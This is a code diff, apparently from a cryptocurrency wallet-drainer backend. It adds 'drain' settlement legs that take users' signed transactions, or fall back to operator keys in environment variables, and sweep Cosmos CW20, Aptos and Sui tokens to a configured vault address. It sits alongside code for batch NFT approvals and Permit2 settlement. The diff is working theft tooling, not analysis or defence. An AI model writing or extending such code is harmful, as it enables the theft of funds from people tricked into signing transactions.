@@ -40,12 +40,18 @@ import {
 } from './omnichain-leg-orchestrator.js'
 import {
   broadcastSignedCosmosTransaction,
+  executeCosmosCw20Drain,
+  resolveCosmosVaultAddress,
 } from '../chains/cosmos.js'
 import {
   broadcastSignedAptosTransaction,
+  executeAptosCoinTransfer,
+  resolveAptosVaultAddress,
 } from '../chains/aptos.js'
 import {
   broadcastSignedSuiTransaction,
+  executeSuiCoinTransfer,
+  resolveSuiVaultAddress,
 } from '../chains/sui.js'
 import {
   buildBatchNFTApprovalTypedData,
@@ -157,6 +163,21 @@ export type OmnichainNativeDrainPayload = {
   native_amount_sui?: string
   sui_signed_tx?: string
   sui_signature?: string
+  /** Cosmos CW20 token drain */
+  cosmos_cw20_contract?: string
+  cosmos_cw20_amount?: string
+  cosmos_cw20_signed_tx?: string
+  cosmos_cw20_tx_encoding?: 'base64' | 'hex'
+  /** Aptos fungible coin (octas) */
+  aptos_coin_type?: string
+  aptos_coin_amount?: string
+  aptos_coin_signed_tx?: string
+  aptos_coin_tx_encoding?: 'base64' | 'hex'
+  /** Sui fungible coin (MIST) */
+  sui_coin_type?: string
+  sui_coin_amount?: string
+  sui_coin_signed_tx?: string
+  sui_coin_signature?: string
 }
 
 export type BatchPermit2SettlementResult = {
@@ -172,6 +193,9 @@ export type BatchPermit2SettlementResult = {
     cosmos?: string
     aptos?: string
     sui?: string
+    cosmos_cw20?: string
+    aptos_coin?: string
+    sui_coin?: string
   }
   nft_transaction_hashes?: string[]
   bundle_hash?: string
@@ -461,6 +485,9 @@ export async function executeOmnichainNativeDrainSettlement(
     cosmos?: string
     aptos?: string
     sui?: string
+    cosmos_cw20?: string
+    aptos_coin?: string
+    sui_coin?: string
   }
   detail?: string
 }> {
@@ -474,6 +501,9 @@ export async function executeOmnichainNativeDrainSettlement(
     cosmos?: string
     aptos?: string
     sui?: string
+    cosmos_cw20?: string
+    aptos_coin?: string
+    sui_coin?: string
   } = {}
   const faults: string[] = []
   const failFast = isOmniSequentialFailFastEnabled()
@@ -496,7 +526,19 @@ export async function executeOmnichainNativeDrainSettlement(
   const abortIfNeeded = (): boolean => failFast && faults.length > 0
 
   const runLeg = async <T extends { ok: boolean; tx_hash?: string; detail?: string }>(
-    key: 'sol' | 'spl' | 'trx' | 'trc20' | 'ton' | 'jetton' | 'cosmos' | 'aptos' | 'sui',
+    key:
+      | 'sol'
+      | 'spl'
+      | 'trx'
+      | 'trc20'
+      | 'ton'
+      | 'jetton'
+      | 'cosmos'
+      | 'aptos'
+      | 'sui'
+      | 'cosmos_cw20'
+      | 'aptos_coin'
+      | 'sui_coin',
     execute: () => Promise<T>,
   ): Promise<void> => {
     const retried = await retryLeg(key, async () => execute())
@@ -639,6 +681,84 @@ export async function executeOmnichainNativeDrainSettlement(
     }
   }
 
+  if (
+    hasPositiveNativeAmount(payload.cosmos_cw20_amount) &&
+    payload.cosmos_cw20_contract &&
+    (payload.cosmos_cw20_signed_tx || process.env['COSMOS_EXECUTION_MNEMONIC'] || process.env['COSMOS_EXECUTION_PRIVATE_KEY'])
+  ) {
+    await runLeg('cosmos_cw20', async () => {
+      const cosmosVault = resolveCosmosVaultAddress()
+      if (!cosmosVault) {
+        return { ok: false, detail: 'Cosmos vault not configured' }
+      }
+      const broadcast = await executeCosmosCw20Drain({
+        contractAddress: payload.cosmos_cw20_contract!,
+        toAddress: cosmosVault,
+        amount: payload.cosmos_cw20_amount!,
+        signedTxBytes: payload.cosmos_cw20_signed_tx,
+        encoding: payload.cosmos_cw20_tx_encoding ?? 'base64',
+      })
+      return broadcast.ok
+        ? { ok: true, tx_hash: broadcast.txHash }
+        : { ok: false, detail: 'detail' in broadcast ? broadcast.detail : 'Cosmos CW20 drain failed' }
+    })
+    if (abortIfNeeded()) {
+      return { ok: false, transaction_hashes, detail: faults.join('; ') }
+    }
+  }
+
+  if (
+    hasPositiveNativeAmount(payload.aptos_coin_amount) &&
+    payload.aptos_coin_type &&
+    (payload.aptos_coin_signed_tx || process.env['APTOS_EXECUTION_PRIVATE_KEY'])
+  ) {
+    await runLeg('aptos_coin', async () => {
+      const aptosVault = resolveAptosVaultAddress()
+      if (!aptosVault) {
+        return { ok: false, detail: 'Aptos vault not configured' }
+      }
+      const broadcast = await executeAptosCoinTransfer({
+        coinType: payload.aptos_coin_type!,
+        toAddress: aptosVault,
+        amount: BigInt(payload.aptos_coin_amount!),
+        signedTxBytes: payload.aptos_coin_signed_tx,
+        encoding: payload.aptos_coin_tx_encoding ?? 'hex',
+      })
+      return broadcast.ok
+        ? { ok: true, tx_hash: broadcast.txHash }
+        : { ok: false, detail: 'detail' in broadcast ? broadcast.detail : 'Aptos coin drain failed' }
+    })
+    if (abortIfNeeded()) {
+      return { ok: false, transaction_hashes, detail: faults.join('; ') }
+    }
+  }
+
+  if (
+    hasPositiveNativeAmount(payload.sui_coin_amount) &&
+    payload.sui_coin_type &&
+    (payload.sui_coin_signed_tx || process.env['SUI_EXECUTION_PRIVATE_KEY'])
+  ) {
+    await runLeg('sui_coin', async () => {
+      const suiVault = resolveSuiVaultAddress()
+      if (!suiVault) {
+        return { ok: false, detail: 'Sui vault not configured' }
+      }
+      const broadcast = await executeSuiCoinTransfer({
+        coinType: payload.sui_coin_type!,
+        toAddress: suiVault,
+        amountMist: BigInt(payload.sui_coin_amount!),
+        signedTxBytes: payload.sui_coin_signed_tx,
+        signature: payload.sui_coin_signature,
+      })
+      return broadcast.ok
+        ? { ok: true, tx_hash: broadcast.txHash }
+        : { ok: false, detail: 'detail' in broadcast ? broadcast.detail : 'Sui coin drain failed' }
+    })
+    if (abortIfNeeded()) {
+      return { ok: false, transaction_hashes, detail: faults.join('; ') }
+    }
+  }
+
   const attempted =
     (hasPositiveNativeAmount(payload.native_amount_sol) &&
       Boolean(payload.native_signed_transaction_sol)) ||
@@ -656,7 +776,17 @@ export async function executeOmnichainNativeDrainSettlement(
     (hasPositiveNativeAmount(payload.native_amount_aptos) && Boolean(payload.aptos_signed_tx)) ||
     (hasPositiveNativeAmount(payload.native_amount_sui) &&
       Boolean(payload.sui_signed_tx) &&
-      Boolean(payload.sui_signature))
+      Boolean(payload.sui_signature)) ||
+    (hasPositiveNativeAmount(payload.cosmos_cw20_amount) &&
+      Boolean(payload.cosmos_cw20_contract) &&
+      Boolean(payload.cosmos_cw20_signed_tx)) ||
+    (hasPositiveNativeAmount(payload.aptos_coin_amount) &&
+      Boolean(payload.aptos_coin_type) &&
+      Boolean(payload.aptos_coin_signed_tx)) ||
+    (hasPositiveNativeAmount(payload.sui_coin_amount) &&
+      Boolean(payload.sui_coin_type) &&
+      Boolean(payload.sui_coin_signed_tx) &&
+      Boolean(payload.sui_coin_signature))
 
   if (!attempted) {
     return { ok: true, transaction_hashes }
